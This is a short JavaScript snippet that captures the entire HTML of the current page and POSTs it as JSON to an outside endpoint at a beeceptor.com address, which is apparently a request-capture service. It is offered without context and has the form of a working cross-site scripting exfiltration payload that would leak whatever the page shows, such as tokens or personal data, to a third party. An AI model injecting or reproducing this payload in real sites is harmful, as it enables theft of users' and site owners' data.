var htmlContent = document.documentElement.innerHTML;
var xhr = new XMLHttpRequest();
var endpointUrl = "https://geetika.free.beeceptor.com";
xhr.open("POST", endpointUrl);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({ htmlContent: htmlContent }));

